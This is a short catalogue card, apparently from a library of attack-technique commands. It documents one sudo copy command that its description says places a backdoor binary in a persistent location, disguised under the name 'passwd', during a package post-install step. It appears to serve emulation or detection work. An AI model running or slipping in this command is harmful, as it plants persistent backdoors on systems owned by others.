---
id: cmd-002
data: sudo cp /opt/src/run /suidfs/passwd
tags:
  - file-copy
type: command
output: File copied successfully
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.220Z'
verified: false
validated: true
submitted: true
---
# sudo-cp-copy-binary

## Command

```bash
sudo cp /opt/src/run /suidfs/passwd
```

## Description

Copies the backdoor binary to a persistent location using sudo during postinst.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /opt/src/run | Source binary | Yes |
| /suidfs/passwd | Destination | Yes |

## Examples

### Basic Usage

```bash
sudo cp /opt/src/run /suidfs/passwd
```

## Expected Output

No output if successful; file present at destination.

## Related

- [[commands/sudo-chown-root-binary]]
